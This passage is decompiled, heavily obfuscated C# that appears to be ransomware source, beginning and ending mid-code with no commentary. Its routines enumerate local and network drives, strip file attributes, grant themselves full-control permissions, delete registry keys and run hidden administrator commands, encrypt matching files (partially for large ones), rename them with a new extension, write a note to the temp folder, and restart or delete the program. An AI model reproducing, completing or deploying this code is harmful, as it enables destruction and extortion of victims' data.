&& !fileInfo.FullName.EndsWith(getString_0(107390208)) && !fileInfo.FullName.EndsWith(getString_0(107390171)) && !fileInfo.FullName.EndsWith(getString_0(107390166)) && !fileInfo.FullName.Contains(getString_0(107390161)) && !fileInfo.FullName.Contains(jvLiLiQoTuDZZR) && !fileInfo.FullName.Contains(yOCAHBSkOQrG) && !fileInfo.FullName.Contains(yPUIdDWXTirNp))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(IDJKHdVBMvjds) * 1024.0 * 1024.0 && PAdnDlyZDpGVLVKD == getString_0(107396930))
						{
							list.Add(fileInfo.FullName);
							pqjTZdzdxB(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && PAdnDlyZDpGVLVKD == getString_0(107397187))
						{
							list.Add(fileInfo.FullName);
							pqjTZdzdxB(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static void pFqQuMWLVLQyQS()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107390176));
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!sxPtPKBcUpYvx.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107390123), getString_0(107396788)).Replace(getString_0(107390118), getString_0(107390123))
					.Replace(getString_0(107390109), getString_0(107391574))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					sxPtPKBcUpYvx.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107390123), getString_0(107396788)).Replace(getString_0(107390118), getString_0(107390123))
						.Replace(getString_0(107390109), getString_0(107391574))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107390072), getString_0(107391574)));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string OVDOHnvaqGQX(string TaDAVDSKFMj = "", string CmBERlvVgtGw = "")
	{
		string result = getString_0(107391574);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = TaDAVDSKFMj,
				Arguments = CmBERlvVgtGw,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void VDXdVFekUfOSrU(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107390063),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string GQbUuBJqDRmd(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string EGPIgSWIAKjM(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static bool AJPgtAMuYftvrfR()
	{
		WebRequest webRequest = WebRequest.Create(getString_0(107390078));
		try
		{
			webRequest.GetResponse();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static void mjzeUtGoNzXmfZH(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = EGPIgSWIAKjM(getString_0(107390557));
		processStartInfo.Arguments = getString_0(107390528) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool esBIxzxbbEqKM(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static string VbkfzVDMGVYRp(SecureString secureString_0)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(secureString_0);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void UcdApWvUtGru()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = GQbUuBJqDRmd(getString_0(107390491));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(EGPIgSWIAKjM(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(EGPIgSWIAKjM(getString_0(107390353)));
					registryKey.DeleteSubKey(EGPIgSWIAKjM(getString_0(107390328)));
					registryKey.DeleteSubKey(EGPIgSWIAKjM(getString_0(107390343)));
					registryKey.DeleteSubKey(EGPIgSWIAKjM(getString_0(107389774)));
					registryKey.DeleteSubKey(EGPIgSWIAKjM(getString_0(107390557)));
					registryKey.DeleteSubKey(EGPIgSWIAKjM(getString_0(107389749)));
					registryKey.DeleteSubKey(EGPIgSWIAKjM(getString_0(107389720)));
					registryKey.Close();
				}
				string_ = GQbUuBJqDRmd(getString_0(107389735));
				registryKey = Registry.LocalMachine.OpenSubKey(EGPIgSWIAKjM(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(EGPIgSWIAKjM(getString_0(107389638)));
					registryKey.Close();
				}
				string_ = GQbUuBJqDRmd(getString_0(107389589));
				registryKey = Registry.LocalMachine.OpenSubKey(EGPIgSWIAKjM(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(EGPIgSWIAKjM(getString_0(107389638)));
					registryKey.Close();
				}
				string_ = GQbUuBJqDRmd(getString_0(107389589));
				registryKey = Registry.CurrentUser.OpenSubKey(EGPIgSWIAKjM(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(EGPIgSWIAKjM(getString_0(107389638)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			OVDOHnvaqGQX(EGPIgSWIAKjM(getString_0(107389604)), EGPIgSWIAKjM(getString_0(107389555)));
			OVDOHnvaqGQX(EGPIgSWIAKjM(getString_0(107390050)), EGPIgSWIAKjM(getString_0(107390009)));
			OVDOHnvaqGQX(EGPIgSWIAKjM(getString_0(107390050)), EGPIgSWIAKjM(getString_0(107389895)));
			OVDOHnvaqGQX(EGPIgSWIAKjM(getString_0(107389834)), EGPIgSWIAKjM(getString_0(107389273)));
		}
		catch
		{
		}
	}

	public static void sefrHhiPzMkPz(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(EGPIgSWIAKjM(getString_0(107389200)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void ETtmljrWZSlTm()
	{
		string string_ = GQbUuBJqDRmd(getString_0(107389175));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(EGPIgSWIAKjM(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(EGPIgSWIAKjM(getString_0(107389126)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void oxhjEFnvlv()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			OVDOHnvaqGQX(EGPIgSWIAKjM(getString_0(107389093)), EGPIgSWIAKjM(getString_0(107389048)));
			OVDOHnvaqGQX(EGPIgSWIAKjM(getString_0(107389093)), EGPIgSWIAKjM(getString_0(107389430)));
		}
	}

	[DllImport("mpr.dll")]
	private static extern int WNetGetUniversalNameA(string string_0, int int_0, IntPtr intptr_0, ref int int_1);

	private static string pkvBVGEDOwRZI(string NDiXelOqfeby, int xOSWWXNGInDiVFfu = 2000)
	{
		IntPtr intPtr;
		try
		{
			intPtr = Marshal.AllocHGlobal(xOSWWXNGInDiVFfu);
		}
		catch (OutOfMemoryException)
		{
			return null;
		}
		try
		{
			if (WNetGetUniversalNameA(NDiXelOqfeby, 1, intPtr, ref xOSWWXNGInDiVFfu) != 0)
			{
				return null;
			}
			return Marshal.PtrToStringAnsi(Marshal.ReadIntPtr(intPtr));
		}
		catch (Exception)
		{
			return null;
		}
		finally
		{
			Marshal.FreeHGlobal(intPtr);
		}
	}

	public static void STbtyipgaiFwyyV()
	{
		OVDOHnvaqGQX(getString_0(107397075), EGPIgSWIAKjM(getString_0(107389316)));
		string text = EGPIgSWIAKjM(getString_0(107388610));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107390109) + text + getString_0(107390109) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107397075);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void ZmXvznsbkj(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (XZxMDRItGAyFV)
			{
				try
				{
					File.AppendAllText(yOCAHBSkOQrG, getString_0(107388545) + string_0 + getString_0(107389016) + ex.Message + getString_0(107396366));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string HOGYmrndAaRDe()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107391574);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107388959);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107388950))) ? getString_0(107388964) : getString_0(107388941));
				break;
			case 0:
				text = getString_0(107388955);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107388922);
				break;
			case 4:
				text = getString_0(107388909);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107388891) : getString_0(107388932));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107388899) : getString_0(107388904)) : getString_0(107388877)) : getString_0(107388886));
				break;
			case 10:
				text = getString_0(107388894);
				break;
			}
		}
		if (text != getString_0(107391574))
		{
			text = getString_0(107388857) + text;
			if (oSVersion.ServicePack != getString_0(107391574))
			{
				text = text + getString_0(107388876) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string sQzmjgGwzuanY(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395987);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(EGPIgSWIAKjM(getString_0(107395954)));
				streamWriter.WriteLine(getString_0(107396366));
				streamWriter.WriteLine(EGPIgSWIAKjM(getString_0(107392072)));
				streamWriter.WriteLine(string_0);
				if (JpnkvfNRcNgFvyr)
				{
					streamWriter.WriteLine(getString_0(107396366));
					streamWriter.WriteLine(EGPIgSWIAKjM(getString_0(107391930)));
					streamWriter.WriteLine(XWEZyRndCFE.HppztbCiyZDw());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !HtEoifwVYHx)
				{
					File.AppendAllText(text, getString_0(107391897) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (XZxMDRItGAyFV)
			{
				try
				{
					File.AppendAllText(yOCAHBSkOQrG, getString_0(107388871) + ex.Message + getString_0(107396366));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void YNKEnDcWehEvB(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		zoWrECbrrsVyZ.yHnLnxWYeZg CS_0024_003C_003E8__locals0 = new zoWrECbrrsVyZ();
		CS_0024_003C_003E8__locals0.XNUYWUgkag = string_1;
		CS_0024_003C_003E8__locals0.FwHbPZhpGwFNinHy = string_2;
		CS_0024_003C_003E8__locals0.mPoMybVvWslofL = string_3;
		CS_0024_003C_003E8__locals0.ecQGXsQFwB = string_4;
		bmXnqjSSiXMovR = Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.mPoMybVvWslofL);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107396646))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (!array[i].IsReady || array[i].DriveType == DriveType.CDRom)
					{
						continue;
					}
					if (array[i].DriveType == DriveType.Network)
					{
						try
						{
							string text = pkvBVGEDOwRZI(array[i].Name);
							if (!string.IsNullOrEmpty(text) && !sxPtPKBcUpYvx.Contains(text))
							{
								sxPtPKBcUpYvx.Add(text);
							}
							else if (!sxPtPKBcUpYvx.Contains(array[i].Name))
							{
								sxPtPKBcUpYvx.Add(array[i].Name);
							}
						}
						catch (Exception)
						{
							if (!sxPtPKBcUpYvx.Contains(array[i].Name))
							{
								sxPtPKBcUpYvx.Add(array[i].Name);
							}
						}
					}
					else if (!sxPtPKBcUpYvx.Contains(array[i].Name))
					{
						sxPtPKBcUpYvx.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!sxPtPKBcUpYvx.Contains(string_0[j]))
				{
					sxPtPKBcUpYvx.Add(string_0[j]);
				}
			}
		}
		if (sxPtPKBcUpYvx.Contains(EGPIgSWIAKjM(getString_0(107388782))) && iLkmHPmfNvtm == getString_0(107396930))
		{
			sxPtPKBcUpYvx.Remove(EGPIgSWIAKjM(getString_0(107388782)));
		}
		Parallel.ForEach(sxPtPKBcUpYvx, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new zoWrECbrrsVyZ.yHnLnxWYeZg();
			CS_0024_003C_003E8__locals0.YOIWxISsNv = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.sCDbMwWBxYm = string_0;
			if (RNbLVUbXIeVe && !HOGYmrndAaRDe().Contains(zoWrECbrrsVyZ.getString_0(107388900)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						esBIxzxbbEqKM(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.sCDbMwWBxYm);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (YuSNGaINVaPF == zoWrECbrrsVyZ.getString_0(107396939))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					RAEwltXoetBa(CS_0024_003C_003E8__locals0.sCDbMwWBxYm, CS_0024_003C_003E8__locals0.YOIWxISsNv.XNUYWUgkag, CS_0024_003C_003E8__locals0.YOIWxISsNv.ecQGXsQFwB, CS_0024_003C_003E8__locals0.YOIWxISsNv.FwHbPZhpGwFNinHy, CS_0024_003C_003E8__locals0.YOIWxISsNv.mPoMybVvWslofL);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				RAEwltXoetBa(CS_0024_003C_003E8__locals0.sCDbMwWBxYm, CS_0024_003C_003E8__locals0.XNUYWUgkag, CS_0024_003C_003E8__locals0.ecQGXsQFwB, CS_0024_003C_003E8__locals0.FwHbPZhpGwFNinHy, CS_0024_003C_003E8__locals0.mPoMybVvWslofL);
			}
		});
	}

	public static void RAEwltXoetBa(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107391574));
		List<string> list3 = list2;
		if (hkUPNgknXz == getString_0(107397187))
		{
			list = EJAfsEPAtDcZE(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = LCpFquDeRc.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_03a0;
					}
				}
				if ((nukUwKRHPU == getString_0(107397187) && !item.EndsWith(text)) || HHTmAplzYnkC.Contains(item))
				{
					continue;
				}
				if (yhFbdsJLRKYdl == getString_0(107396930))
				{
					try
					{
						if (zGlAchxvJLmK.dWjNsbdIDYugAHM(item))
						{
							zGlAchxvJLmK.cAezDgsOeZnyK(item);
						}
					}
					catch
					{
					}
				}
				HHTmAplzYnkC.Add(item);
				if (!fFYazcYEiRSnDfdk.Contains(Path.GetDirectoryName(item)))
				{
					fFYazcYEiRSnDfdk.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (xUUeBPLKKIuVcVa == getString_0(107396930) && fileStream.Length > Convert.ToInt32(DtPlrxKatW) * 1024 * 1024 && !list3.Contains(text))
					{
						if (GymFZfNQBIzJM == getString_0(107396930))
						{
							foreach (string item2 in WKHvNffqtncUxo)
							{
								if (item.ToLower().EndsWith(item2) && PoekpaMfsIzdNH == getString_0(107396930))
								{
									if (Convert.ToInt32(LrknPqaBUod) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											XWEZyRndCFE.iNNSScDiDt(getString_0(107391175), getString_0(107391170), getString_0(107391125), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && PoekpaMfsIzdNH == getString_0(107397187))
								{
									try
									{
										XWEZyRndCFE.iNNSScDiDt(getString_0(107391175), getString_0(107391170), getString_0(107391125), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = KpGxARzmOhh.VRtoBnWLnEyOffOBW(item, Convert.ToInt32(DtPlrxKatW) * 1024 * 1024);
						byte[] xCiesfIreL = KpGxARzmOhh.hFniFSRZbJWsGd(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						KpGxARzmOhh.mQuEGeDjhvV(item, xCiesfIreL);
						if (string_2 != getString_0(107388805))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107388805))
					{
						WLwUOssbJlcv(item, item + string_2, bmXnqjSSiXMovR);
					}
					else
					{
						WLwUOssbJlcv(item, item + getString_0(107388800), bmXnqjSSiXMovR);
					}
				}
				catch (Exception)
				{
				}
				IL_03a0:;
			}
		}
	}

	public static void pqjTZdzdxB(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		QNsCvQIrCsizt.iSFmNVBbBBeAPzre CS_0024_003C_003E8__locals0 = new QNsCvQIrCsizt();
		CS_0024_003C_003E8__locals0.yLHvSWZyIOfSs = list_0;
		CS_0024_003C_003E8__locals0.jMMRdoeBzVf = string_1;
		CS_0024_003C_003E8__locals0.LuTPQCjXbTuWq = string_2;
		CS_0024_003C_003E8__locals0.slZaBQOSteyNrUAU = string_3;
		CS_0024_003C_003E8__locals0.HuYUDDzzhQG = new List<string> { getString_0(107391574) };
		if (nukUwKRHPU == getString_0(107397187))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.yLHvSWZyIOfSs)
				{
					if (CS_0024_003C_003E8__locals0.LuTPQCjXbTuWq.Length != 0)
					{
						string[] luTPQCjXbTuWq2 = CS_0024_003C_003E8__locals0.LuTPQCjXbTuWq;
						int num2 = 0;
						while (num2 < luTPQCjXbTuWq2.Length)
						{
							string value2 = luTPQCjXbTuWq2[num2];
							if (!item.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_09e1;
						}
					}
					try
					{
						if (item.EndsWith(CS_0024_003C_003E8__locals0.jMMRdoeBzVf))
						{
							goto IL_09e1;
						}
					}
					catch (Exception)
					{
						goto IL_09e1;
					}
					if (item.EndsWith(string_0) && !HHTmAplzYnkC.Contains(item))
					{
						if (yhFbdsJLRKYdl == QNsCvQIrCsizt.getString_0(107396947))
						{
							try
							{
								if (zGlAchxvJLmK.dWjNsbdIDYugAHM(item))
								{
									zGlAchxvJLmK.cAezDgsOeZnyK(item);
								}
							}
							catch
							{
							}
						}
						HHTmAplzYnkC.Add(item);
						if (!fFYazcYEiRSnDfdk.Contains(Path.GetDirectoryName(item)))
						{
							fFYazcYEiRSnDfdk.Add(Path.GetDirectoryName(item));
						}
						ZmXvznsbkj(item);
						try
						{
							new fMzozyDPnFPucI().dxDBhZVDUbiD(item);
						}
						catch
						{
						}
						try
						{
							using FileStream fileStream2 = new FileStream(item, FileMode.Open, FileAccess.Write);
							if (!fileStream2.CanWrite)
							{
								try
								{
									if (AvItfCfoelurZ)
									{
										Console.WriteLine(QNsCvQIrCsizt.getString_0(107405603) + item + QNsCvQIrCsizt.getString_0(107405590) + new FileInfo(item).Length + QNsCvQIrCsizt.getString_0(107405537));
										Console.WriteLine(QNsCvQIrCsizt.getString_0(107405560));
									}
								}
								catch
								{
								}
								OVDOHnvaqGQX(EGPIgSWIAKjM(QNsCvQIrCsizt.getString_0(107405455)), QNsCvQIrCsizt.getString_0(107390126) + item + QNsCvQIrCsizt.getString_0(107390126) + EGPIgSWIAKjM(QNsCvQIrCsizt.getString_0(107405942)) + QNsCvQIrCsizt.getString_0(107390126) + Environment.UserName + QNsCvQIrCsizt.getString_0(107390126) + EGPIgSWIAKjM(QNsCvQIrCsizt.getString_0(107405893)));
							}
						}
						catch (Exception ex18)
						{
							if (XZxMDRItGAyFV)
							{
								try
								{
									File.AppendAllText(yOCAHBSkOQrG, QNsCvQIrCsizt.getString_0(107388562) + item + QNsCvQIrCsizt.getString_0(107405868) + ex18.Message + QNsCvQIrCsizt.getString_0(107396383));
								}
								catch (Exception)
								{
								}
							}
							continue;
						}
						try
						{
							try
							{
								if (new FileInfo(item).Length != 0L)
								{
									goto end_IL_02cd;
								}
								goto end_IL_02cd_2;
								end_IL_02cd:;
							}
							catch (Exception ex20)
							{
								if (XZxMDRItGAyFV)
								{
									try
									{
										File.AppendAllText(yOCAHBSkOQrG, QNsCvQIrCsizt.getString_0(107388562) + item + QNsCvQIrCsizt.getString_0(107405819) + ex20.Message + QNsCvQIrCsizt.getString_0(107396383));
									}
									catch (Exception)
									{
									}
								}
								cRWjcXvHmjJ++;
								goto end_IL_02cd_2;
							}
							if (!(xUUeBPLKKIuVcVa == QNsCvQIrCsizt.getString_0(107396947)) || new FileInfo(item).Length <= Convert.ToInt32(DtPlrxKatW) * 1024 * 1024 || CS_0024_003C_003E8__locals0.HuYUDDzzhQG.Contains(string_0))
							{
								if (JpnkvfNRcNgFvyr)
								{
									CS_0024_003C_003E8__locals0.jMMRdoeBzVf = YGiQSxTfeRxLt + CS_0024_003C_003E8__locals0.jMMRdoeBzVf;
								}
								string text3 = QTGNdgSVzFrIZ.DlttFolCftdlp(32);
								string s3 = uibsyoaCixjw.DOQQVROAHbcwo(text3);
								byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
								if (CS_0024_003C_003E8__locals0.jMMRdoeBzVf != QNsCvQIrCsizt.getString_0(107388822))
								{
									if (!VdDqLkflmc)
									{
										if (!HtEoifwVYHx)
										{
											ogLAgAYNFI(item, item + CS_0024_003C_003E8__locals0.jMMRdoeBzVf, bmXnqjSSiXMovR);
										}
										else
										{
											ogLAgAYNFI(item, item + CS_0024_003C_003E8__locals0.jMMRdoeBzVf, Encoding.ASCII.GetBytes(text3));
										}
									}
									else
									{
										try
										{
											if (!HtEoifwVYHx)
											{
												OoNZqxrDFxbIfCy(item, item + CS_0024_003C_003E8__locals0.jMMRdoeBzVf, bmXnqjSSiXMovR);
											}
											else
											{
												OoNZqxrDFxbIfCy(item, item + CS_0024_003C_003E8__locals0.jMMRdoeBzVf, Encoding.ASCII.GetBytes(text3));
											}
										}
										catch (Exception ex22)
										{
											if (XZxMDRItGAyFV)
											{
												try
												{
													File.AppendAllText(yOCAHBSkOQrG, QNsCvQIrCsizt.getString_0(107388562) + item + QNsCvQIrCsizt.getString_0(107388264) + ex22.Message + QNsCvQIrCsizt.getString_0(107396383));
												}
												catch (Exception)
												{
												}
											}
											cRWjcXvHmjJ++;
											try
											{
												File.Move(item + CS_0024_003C_003E8__locals0.jMMRdoeBzVf, item);
											}
											catch (Exception)
											{
											}
											goto end_IL_02cd_2;
										}
									}
								}
								else if (!VdDqLkflmc)
								{
									if (!HtEoifwVYHx)
									{
										ogLAgAYNFI(item, item + QNsCvQIrCsizt.getString_0(107388817), bmXnqjSSiXMovR);
									}
									else
									{
										ogLAgAYNFI(item, item + QNsCvQIrCsizt.getString_0(107388817), Encoding.ASCII.GetBytes(text3));
									}
								}
								else
								{
									try
									{
										if (!HtEoifwVYHx)
										{
											OoNZqxrDFxbIfCy(item, item, bmXnqjSSiXMovR);
										}
										else
										{
											OoNZqxrDFxbIfCy(item, item, Encoding.ASCII.GetBytes(text3));
										}
									}
									catch (Exception ex25)
									{
										if (XZxMDRItGAyFV)
										{
											try
											{
												File.AppendAllText(yOCAHBSkOQrG, QNsCvQIrCsizt.getString_0(107388562) + item + QNsCvQIrCsizt.getString_0(107388264) + ex25.Message + QNsCvQIrCsizt.getString_0(107396383));
											}
											catch (Exception)
											{
											}
										}
										cRWjcXvHmjJ++;
										goto end_IL_02cd_2;
									}
								}
								if (HtEoifwVYHx)
								{
									if (CS_0024_003C_003E8__locals0.jMMRdoeBzVf != QNsCvQIrCsizt.getString_0(107388822))
									{
										sefrHhiPzMkPz(item + CS_0024_003C_003E8__locals0.jMMRdoeBzVf, bytes3);
									}
									else
									{
										sefrHhiPzMkPz(item, bytes3);
									}
								}
								goto IL_09e1;
							}
							CS_0024_003C_003E8__locals0 = new QNsCvQIrCsizt.eqlNXtZpMbqrj();
							CS_0024_003C_003E8__locals0.qqCjCfsGjuRl = CS_0024_003C_003E8__locals0;
							try
							{
								if (CS_0024_003C_003E8__locals0.jMMRdoeBzVf != QNsCvQIrCsizt.getString_0(107388822))
								{
									if (JpnkvfNRcNgFvyr)
									{
										CS_0024_003C_003E8__locals0.jMMRdoeBzVf = YGiQSxTfeRxLt + CS_0024_003C_003E8__locals0.jMMRdoeBzVf;
									}
									File.Move(item, item + CS_0024_003C_003E8__locals0.jMMRdoeBzVf);
								}
							}
							catch (Exception ex27)
							{
								if (XZxMDRItGAyFV)
								{
									try
									{
										File.AppendAllText(yOCAHBSkOQrG, QNsCvQIrCsizt.getString_0(107388562) + item + QNsCvQIrCsizt.getString_0(107405726) + ex27.Message + QNsCvQIrCsizt.getString_0(107396383));
									}
									catch (Exception)
									{
									}
								}
								cRWjcXvHmjJ++;
								goto end_IL_02cd_2;
							}
							CS_0024_003C_003E8__locals0.JEWgqUOjjJbOLH = QNsCvQIrCsizt.getString_0(107391591);
							if (CS_0024_003C_003E8__locals0.jMMRdoeBzVf != QNsCvQIrCsizt.getString_0(107388822))
							{
								CS_0024_003C_003E8__locals0.JEWgqUOjjJbOLH = item + CS_0024_003C_003E8__locals0.jMMRdoeBzVf;
							}
							else
							{
								CS_0024_003C_003E8__locals0.JEWgqUOjjJbOLH = item;
							}
							if (GymFZfNQBIzJM == QNsCvQIrCsizt.getString_0(107396947))
							{
								Thread thread2 = new Thread((ThreadStart)delegate
								{
									foreach (string item2 in WKHvNffqtncUxo)
									{
										if (CS_0024_003C_003E8__locals0.JEWgqUOjjJbOLH.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.qqCjCfsGjuRl.jMMRdoeBzVf) && PoekpaMfsIzdNH == QNsCvQIrCsizt.eqlNXtZpMbqrj.getString_0(107396950))
										{
											if (Convert.ToInt32(LrknPqaBUod) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.JEWgqUOjjJbOLH).Length)
											{
												try
												{
